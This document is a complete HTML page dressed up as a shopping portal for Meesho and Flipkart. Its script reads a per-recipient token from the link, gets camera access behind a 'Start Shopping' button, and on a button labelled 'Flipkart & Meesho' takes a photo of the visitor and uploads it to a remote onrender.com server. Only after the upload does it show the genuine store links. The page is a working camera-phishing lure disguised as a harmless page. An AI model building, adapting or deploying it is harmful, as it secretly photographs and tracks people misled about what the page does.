
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Shopping</title>

<style>
  body {
    font-family: Arial, sans-serif;
    background: #f2f4f8;
    text-align: center;
    padding: 25px 15px;
  }

  .container {
    max-width: 420px;
    margin: auto;
    background: white;
    padding: 22px;
    border-radius: 16px;
  }

  video {
    width: 100%;
    border-radius: 12px;
    margin: 15px 0;
    background: #222;
  }

  button, .shop {
    display: block;
    width: 100%;
    padding: 14px;
    margin-top: 12px;
    border: none;
    border-radius: 9px;
    font-size: 16px;
    cursor: pointer;
    text-decoration: none;
    box-sizing: border-box;
  }

  button {
    background: #2563eb;
    color: white;
  }

  button:disabled {
    opacity: 0.5;
  }

  .shop {
    color: white;
    font-weight: bold;
  }

  .meesho { background: #9b247b; }
  .flipkart { background: #2874f0; }

  #shoppingLinks, #captureBtn {
    display: none;
  }

  #status {
    margin-top: 15px;
    overflow-wrap: anywhere;
  }
</style>
</head>

<body>
<div class="container">

  <h2>Shopping</h2>

  <p>Shopping On the Meesho And Flipkart
  </p>

  <video id="video" autoplay playsinline muted></video>

  <button id="startBtn">Start Shopping</button>

  <button id="captureBtn">Flipkart & Meesho</button>

  <p id="status"></p>

  <div id="shoppingLinks">
    <h2>🎉 Sent</h2>
    <p>Thank you!</p>

    <a class="shop meesho"
       href="https://www.meesho.com/"
       target="_blank"
       rel="noopener noreferrer">
       🛍️ Shop on Meesho
    </a>

    <a class="shop flipkart"
       href="https://www.flipkart.com/"
       target="_blank"
       rel="noopener noreferrer">
       🛒 Shop on Flipkart
    </a>
  </div>

</div>

<script>
const BACKEND_URL =
  "https://shopping.onrender.com";

const params = new URLSearchParams(location.search);
const token = params.get("session") || params.get("token");

const video = document.getElementById("video");
const startBtn = document.getElementById("startBtn");
const captureBtn = document.getElementById("captureBtn");
const statusText = document.getElementById("status");
const shoppingLinks = document.getElementById("shoppingLinks");

let stream = null;

startBtn.addEventListener("click", async () => {
  try {
    if (!navigator.mediaDevices?.getUserMedia) {
      throw new Error("Camera is not supported. Use HTTPS.");
    }

    stream = await navigator.mediaDevices.getUserMedia({
      video: true,
      audio: false
    });

    video.srcObject = stream;
    await video.play();

    startBtn.disabled = true;
    captureBtn.style.display = "block";
    statusText.textContent = "Camera ready. Preview before sending.";

  } catch (error) {
    statusText.textContent =
      "Camera error: " + error.message;
  }
});

captureBtn.addEventListener("click", async () => {
  if (!token) {
    statusText.textContent = "Invalid or missing session link.";
    return;
  }

  if (!stream || !video.videoWidth) {
    statusText.textContent = "Please start the camera first.";
    return;
  }

  captureBtn.disabled = true;
  statusText.textContent = "Sending photo...";

  try {
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const context = canvas.getContext("2d");
    context.drawImage(video, 0, 0);

    const blob = await new Promise(resolve =>
      canvas.toBlob(resolve, "image/jpeg", 0.9)
    );

    if (!blob) throw new Error("Could not capture photo.");

    const formData = new FormData();
    formData.append("photo", blob, "photo.jpg");

    const response = await fetch(
      `${BACKEND_URL}/upload/${encodeURIComponent(token)}`,
      {
        method: "POST",
        body: formData
      }
    );

    const result = await response.json();

    if (!response.ok) {
      throw new Error(result.error || "Upload failed.");
    }

    statusText.textContent = "";
    captureBtn.style.display = "none";
    startBtn.style.display = "none";
    shoppingLinks.style.display = "block";

    stream.getTracks().forEach(track => track.stop());
    video.srcObject = null;
    stream = null;

  } catch (error) {
    statusText.textContent = "Error: " + error.message;
    captureBtn.disabled = false;
  }
});
</script>
</body>
</html>
